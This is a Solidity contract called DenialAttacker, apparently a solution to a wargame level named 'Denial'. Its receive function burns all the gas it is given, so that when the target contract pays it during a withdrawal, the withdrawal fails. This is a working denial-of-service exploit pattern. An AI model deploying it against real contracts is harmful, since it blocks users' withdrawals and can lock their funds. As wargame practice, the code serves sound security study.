// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDenial {
    function setWithdrawPartner(address _partner) external;
}

contract DenialAttacker {
    IDenial target;
    uint256 temp;

    constructor(address _targetAddress) {
        target = IDenial(_targetAddress);
    }

    receive() external payable {
        while (gasleft() > 0) {
            temp++;
        }
    }
}
